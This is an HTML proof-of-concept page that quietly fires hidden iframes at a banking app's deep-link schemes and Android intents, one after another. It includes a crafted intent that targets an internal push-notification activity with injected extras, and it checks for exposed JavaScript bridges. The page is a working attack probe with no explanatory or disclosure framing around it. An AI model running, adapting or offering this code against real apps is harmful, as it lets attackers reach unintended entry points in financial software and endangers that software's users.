<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ZGC_POC probe2</title>
<style>
body { font-family: monospace; font-size: 15px; padding: 12px; }
h2 { color: #c00; }
pre { white-space: pre-wrap; word-break: break-all; background:#f4f4f4; padding:8px; border:1px solid #ccc; }
</style>
</head>
<body>
<h2>ZGC_POC probe2 v2: iframe scheme/intent test</h2>
<pre id="out">init...</pre>
<script>
var out = [];
function log(s) {
    var t = new Date();
    out.push((t.getMinutes()<10?'0':'')+t.getMinutes()+':'+(t.getSeconds()<10?'0':'')+t.getSeconds() + ' ' + s);
    document.getElementById('out').textContent = out.join('\n');
}
function fireIframe(url) {
    try {
        var f = document.createElement('iframe');
        f.style.display = 'none';
        f.src = url;
        document.body.appendChild(f);
        return 'iframe appended';
    } catch (e) {
        return 'iframe err: ' + e;
    }
}
var vectors = [
    ['V1 zgcbank scheme goScene',
     'zgcbank://dl/public/?channel=goScene'],
    ['V2 myscheme goScene',
     'myscheme://com.zgcbank.android?channel=goScene'],
    ['V3 intent scheme',
     'intent://dl/public/?channel=goScene#Intent;scheme=zgcbank;package=com.mobile.zgcbank;end'],
    ['V4 intent component PushActivity',
     'intent:#Intent;component=com.mobile.zgcbank/com.csii.madp.standard.push.PushActivity;S.custom=%7B%22opt%22%3A%227%22%2C%22channel%22%3A%22marketing%22%7D;S.title=P2V4;end']
];
log('[start] Verification=' + (typeof window.Verification) + ' jsExchange=' + (typeof window.jsExchange));
var idx = 0;
function step() {
    if (idx >= vectors.length) { log('[done] all vectors tried'); return; }
    var v = vectors[idx++];
    log('[try] ' + v[0] + ' -> ' + fireIframe(v[1]));
    setTimeout(step, 3000);
}
setTimeout(step, 1000);
</script>
</body>
</html>
